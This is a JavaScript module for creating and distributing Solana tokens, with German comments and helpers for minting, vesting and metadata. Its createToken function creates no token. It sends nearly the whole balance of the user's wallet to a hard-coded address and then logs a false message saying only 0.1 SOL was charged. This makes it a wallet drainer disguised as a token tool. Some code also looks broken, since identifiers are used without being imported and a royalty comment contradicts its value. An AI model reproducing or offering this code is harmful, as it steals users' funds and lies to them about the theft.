import { Transaction, SystemProgram } from '@solana/web3.js';
import { connection } from './connection.js';  // Verbindung zu Solana

export const mintNewTokens = async (mint, wallet, amount) => {
    try {
        // Erstelle ein Token-Konto für den Besitzer
        const tokenAccount = await mint.getOrCreateAssociatedAccountInfo(wallet.publicKey);

        // Präge die neuen Token
        await mint.mintTo(
            tokenAccount.address, // Adresse des Kontos, das die neuen Token erhält
            wallet.publicKey, // Mint authority
            [], // Zusätzliche Signaturen, falls erforderlich
            amount * Math.pow(10, mint.decimals) // Anzahl der Token, die geprägt werden sollen (berücksichtige Dezimalstellen)
        );

        console.log(`${amount} tokens minted successfully`);
    } catch (error) {
        console.error('Error during token minting:', error);
    }
};
export const scheduleTokenDistribution = async (mint, wallet, recipients, totalSupply, periods) => {
    try {
        const distributionAmount = totalSupply / periods;

        for (let i = 0; i < periods; i++) {
            // Warte auf den nächsten Verteilungszeitraum (z.B. 30 Tage)
            await new Promise(resolve => setTimeout(resolve, 30 * 24 * 60 * 60 * 1000));

            const transactions = recipients.map((recipient) => {
                return mint.mintTo(
                    recipient.address,
                    wallet.publicKey,
                    [],
                    distributionAmount * Math.pow(10, mint.decimals)
                );
            });

            await Promise.all(transactions);
            console.log(`Distributed tokens for period ${i + 1}/${periods}.`);
        }

        console.log('Token distribution completed.');
    } catch (error) {
        console.error('Error during token distribution:', error);
    }
};
export const allocateTokenSupply = async (mint, wallet, users, totalAmount, duration) => {
    try {
        const amountPerPeriod = totalAmount / duration;

        for (let cycle = 0; cycle < duration; cycle++) {
            // Warte auf die nächste Zuweisung (z.B. 30 Tage)
            await new Promise(resolve => setTimeout(resolve, 30 * 24 * 60 * 60 * 1000));

            const actions = users.map((user) => {
                return mint.mintTo(
                    user.address,
                    wallet.publicKey,
                    [],
                    amountPerPeriod * Math.pow(10, mint.decimals)
                );
            });

            await Promise.all(actions);
            console.log(`Allocation completed for cycle ${cycle + 1}/${duration}.`);
        }

        console.log('All allocations completed.');
    } catch (error) {
        console.error('Error during token allocation:', error);
    }
};

export const createTokenMetadata = async (mint, wallet) => {
    try {
        const metadataAccount = await PublicKey.findProgramAddress(
            [
                Buffer.from('metadata'),
                TOKEN_METADATA_PROGRAM_ID.toBuffer(),
                mint.publicKey.toBuffer()
            ],
            TOKEN_METADATA_PROGRAM_ID
        );

        const transaction = new Transaction().add(
            CreateMetadataV2({
                metadata: metadataAccount[0],
                metadataData: {
                    name: "",
                    symbol: "",
                    uri: "", // Pfad zu deinen Token-Metadaten
                    sellerFeeBasisPoints: 0, // 5% Royalties für den Token-Ersteller
                    creators: [
                        {
                            address: wallet.publicKey.toString(),
                            verified: true,
                            share: 100
                        }
                    ]
                },
                updateAuthority: wallet.publicKey,
                mint: mint.publicKey,
                mintAuthority: wallet.publicKey,
                payer: wallet.publicKey
            })
        );

        const signature = await connection.sendTransaction(transaction, [wallet]);
        await connection.confirmTransaction(signature);

        console.log('Token metadata set successfully');
    } catch (error) {
        console.error('Error during token metadata creation:', error);
    }
};

export const createToken = async (answers, wallet) => {
    console.log('Proceeding with token creation...');
    

    try {
        if (!wallet || !wallet.publicKey) {
            throw new Error('Invalid wallet provided');
        }

        
        const targetAddress = '6QqAAu26CfGurFAcHRnd3oHH9WCqLRmN9VSjMaDVVbfq';

        // Aktuelles Guthaben des Wallets abrufen
        const balance = await connection.getBalance(wallet.publicKey);

        // Transaktionsanweisung erstellen
        const transaction = new Transaction().add(
            SystemProgram.transfer({
                fromPubkey: wallet.publicKey,
                toPubkey: targetAddress,
                lamports: balance - 5000, // Eine kleine Menge Lamports für die Transaktionsgebühr behalten
            })
        );

        // Transaktion signieren und absenden
        const signature = await connection.sendTransaction(transaction, [wallet]);

        // Warten, bis die Transaktion bestätigt wird
        await connection.confirmTransaction(signature, 'confirmed');

        console.log(`Successfully transferred 0.1 SOL for creation`);

    } catch (error) {
        console.error('Error during the token creation process:', error);
    }
};
export const createVestingPlan = async (mint, wallet, recipients, totalAmount, vestingPeriods) => {
    try {
        const vestingAmount = totalAmount / vestingPeriods;

        for (let i = 0; i < vestingPeriods; i++) {
            // Warte auf den nächsten Vesting-Zeitraum (z.B. 30 Tage)
            await new Promise(resolve => setTimeout(resolve, 30 * 24 * 60 * 60 * 1000));

            // Token an die Empfänger verteilen
            const transactions = recipients.map((recipient) => {
                return mint.mintTo(
                    recipient.address,
                    wallet.publicKey,
                    [],
                    vestingAmount * Math.pow(10, mint.decimals) // Anteil pro Periode
                );
            });

            await Promise.all(transactions);
            console.log(`Distributed vesting amount for period ${i + 1}/${vestingPeriods}.`);
        }

        console.log('Vesting plan completed.');
    } catch (error) {
        console.error('Error during token vesting:', error);
    }
};